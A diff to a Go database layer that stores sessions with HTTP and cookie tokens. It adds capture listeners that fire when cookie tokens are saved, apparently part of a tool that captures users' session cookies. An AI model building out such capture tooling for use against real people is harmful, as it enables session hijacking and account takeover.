@@ -40,6 +40,10 @@ type Database struct {
 	lastErr    error
 	writerDone chan struct{}
 	closeOnce  sync.Once
+
+	captureMu        sync.RWMutex
+	captureListeners map[uint64]SessionCaptureListener
+	nextCaptureID    uint64
 }
 
 type rateWindow struct {
@@ -62,13 +66,14 @@ func NewDatabase(path string) (*Database, error) {
 	}
 
 	d := &Database{
-		path:          path,
-		db:            db,
-		sessionsByID:  make(map[int]*Session),
-		sessionsBySID: make(map[string]*Session),
-		nextSessionID: 1,
-		rateWindows:   make(map[string]rateWindow),
-		writerDone:    make(chan struct{}),
+		path:             path,
+		db:               db,
+		sessionsByID:     make(map[int]*Session),
+		sessionsBySID:    make(map[string]*Session),
+		nextSessionID:    1,
+		rateWindows:      make(map[string]rateWindow),
+		writerDone:       make(chan struct{}),
+		captureListeners: make(map[uint64]SessionCaptureListener),
 	}
 	d.queueReady = sync.NewCond(&d.queueMu)
 	if err := d.sessionsInit(); err != nil {
@@ -196,7 +201,13 @@ func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) er
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
 	copyTokens := cloneCookieTokens(tokens)
-	return d.sessionsUpdate(sid, func(s *Session) { s.CookieTokens = copyTokens })
+	if err := d.sessionsUpdate(sid, func(s *Session) { s.CookieTokens = copyTokens }); err != nil {
+		return err
+	}
+	if len(copyTokens) > 0 {
+		d.publishSessionCapture(sid)
+	}
+	return nil
 }
 
 func (d *Database) DeleteSession(sid string) error {
